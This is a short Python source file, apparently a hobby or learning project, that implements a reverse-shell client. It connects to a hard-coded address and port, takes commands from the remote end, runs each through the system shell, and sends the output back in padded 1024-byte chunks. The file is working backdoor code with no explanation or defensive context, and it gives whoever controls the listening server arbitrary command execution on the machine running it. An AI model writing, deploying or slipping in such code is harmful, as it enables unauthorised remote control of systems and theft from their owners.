import socket
import subprocess

class client:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.address = (self.ip, self.port)
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection()
    
    def padding(self, data):
        print(f"Before padding : {data}")
        while len(data) != 1024:
            data += b'\0'
        print(f"after padding : {data}")
        return data

    def connection(self):
        self.client_socket.connect(self.address)
        while True:
            command = self.client_socket.recv(1024).decode()
            s = subprocess.run(command, capture_output=True, shell=True)
            if s.stdout != b'':
                chunk = int(len(s.stdout)/1024)
                print(s.stdout)
                if (len(s.stdout)%1024) != 0:
                    chunk += 1
                else:
                    pass
                print(f"Number of chunks: {chunk}")
                inital = 0
                final = 1024
                for var in range(chunk):
                    print(var)
                    data = s.stdout[inital:final]
                    inital += 1024
                    final += 1024
                    data = self.padding(data)
                    self.client_socket.send(data)
                self.client_socket.send(b'done')
            else:
                data = self.padding(s.stderr)
                self.client_socket.send(data)
                self.client_socket.send(b'done')

c = client("127.0.0.1", 1234)